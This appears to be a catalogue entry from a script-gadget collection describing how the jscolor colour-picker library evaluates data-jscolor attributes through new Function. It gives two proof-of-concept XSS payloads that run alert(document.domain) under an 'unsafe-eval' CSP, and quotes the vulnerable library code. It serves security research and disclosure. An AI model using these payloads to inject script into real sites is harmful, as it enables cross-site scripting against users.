---
description: jscolor is a vanilla JavaScript color picker that turns ordinary form controls into customizable widgets.
github: EastDesire/jscolor
gadgets:
  Latest:
    authors:
      - twitter:ixSly
      - github:ixSly
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - description: |
          [jscolor](https://github.com/EastDesire/jscolor) waits for `DOMContentLoaded` before calling `install()`, so it evaluates every `.jscolor` element regardless of whether it appears before or after the library is loaded. With `'unsafe-eval'` enabled in CSP, both payloads in the snippet below run as soon as the picker initializes.
        code: |
          <!-- user input -->
          <x data-jscolor="(function(){alert(document.domain)})()">

          <script nonce="secret" src="https://jscolor.com/release/2.5/jscolor-2.5.2/jscolor.js"></script>
      - description: |
          Because the string is wrapped in parentheses, even seemingly safe object literals run as the body of the generated function. Any property initializers therefore execute as soon as jscolor parses the attribute.
        code: |
          <!-- user input -->
          <x data-jscolor="{a:alert(document.domain)}">

          <script src="https://jscolor.com/release/2.5/jscolor-2.5.2/jscolor.js"></script>
    more-info: |
      **Sink**

      Source: <a target="_blank" href="https://jscolor.com/release/2.5/jscolor-2.5.2/jscolor.js">https://jscolor.com/release/2.5/jscolor-2.5.2/jscolor.js</a>

      ```javascript
      var dataOptions = jsc.getDataAttr(targetElm, 'jscolor');
      if (dataOptions !== null) {
          optsStr = dataOptions;
      } else if (m[4]) {
          optsStr = m[4];
      }

      var opts = {};
      if (optsStr) {
          try {
              opts = (new Function('return (' + optsStr + ')'))();
          } catch(eParseError) {
              jsc.warn('Error parsing jscolor options: ' + eParseError + ':\n' + optsStr);
          }
      }
      ```

      The library automatically calls `jsc.pub.install()` once `DOMContentLoaded` fires, which in turn runs `installBySelector('[data-jscolor]')`. Because the same function can be invoked again later, any element appended after load will hit the exact sink.

      ```javascript
      // Installs jscolor on current DOM tree
      jsc.pub.install = function (rootNode) {
          var success = true;

          try {
              jsc.installBySelector('[data-jscolor]', rootNode);
          } catch (e) {
              success = false;
              console.warn(e);
          }
          // ...
      };
      ```
    links:
      - https://jscolor.com/docs/
---
